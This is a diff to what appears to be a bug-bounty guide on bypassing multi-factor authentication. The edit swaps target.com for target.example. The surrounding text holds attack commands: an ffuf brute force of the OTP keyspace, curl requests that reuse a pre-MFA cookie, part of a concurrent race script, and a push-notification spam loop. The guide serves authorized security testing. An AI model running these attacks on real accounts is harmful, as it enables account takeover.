@@ -62,7 +62,7 @@ MFA bypasses pay High–Critical because they convert "I stole one credential" i
 - **When to suspect:** OTP-verify endpoint accepts a 6-digit code (10^6 keyspace), and you can see no obvious throttling in the response (`X-RateLimit-*`, 429 status, captcha appearance).
 - **Test:** From a session that has completed the password step but not MFA, fuzz the full keyspace:
   ```bash
-  ffuf -u "https://target.com/api/mfa/verify" \
+  ffuf -u "https://target.example/api/mfa/verify" \
     -X POST \
     -H "Content-Type: application/json" \
     -H "Cookie: session=$PRE_MFA" \
@@ -84,9 +84,9 @@ MFA bypasses pay High–Critical because they convert "I stole one credential" i
 - **When to suspect:** Auth flow is: `POST /login` (returns pre-MFA cookie + redirect to `/mfa`) → `POST /mfa/verify` (issues full session) → redirect to `/dashboard`. Pre-MFA and post-MFA sessions may share the same cookie name.
 - **Test:** Complete the password step but NOT the OTP step. With the pre-MFA cookie, navigate directly to a post-MFA-protected endpoint:
   ```bash
-  curl -s -b "session=$PRE_MFA" https://target.com/api/account
-  curl -s -b "session=$PRE_MFA" https://target.com/dashboard
-  curl -s -b "session=$PRE_MFA" https://target.com/api/transactions
+  curl -s -b "session=$PRE_MFA" https://target.example/api/account
+  curl -s -b "session=$PRE_MFA" https://target.example/dashboard
+  curl -s -b "session=$PRE_MFA" https://target.example/api/transactions
   ```
 - **Validation:** The endpoint returns the data it would only return to a fully-authenticated user. The pre-MFA cookie has post-MFA capability.
 - **Pay-grade rationale:** Critical. Pure state-machine bypass.
@@ -109,7 +109,7 @@ MFA bypasses pay High–Critical because they convert "I stole one credential" i
   ```python
   import asyncio, aiohttp
   async def submit(s, code):
-      async with s.post("https://target.com/api/mfa/verify",
+      async with s.post("https://target.example/api/mfa/verify",
                         json={"code": code}) as r:
           return r.status, await r.text()
   async def main():
@@ -152,7 +152,7 @@ MFA bypasses pay High–Critical because they convert "I stole one credential" i
 - **Test:** Spray the "send push" endpoint:
   ```bash
   for i in {1..50}; do
-    curl -s -X POST https://target.com/api/mfa/push/send -b "session=$PRE_MFA"
+    curl -s -X POST https://target.example/api/mfa/push/send -b "session=$PRE_MFA"
     sleep 30
   done
   ```
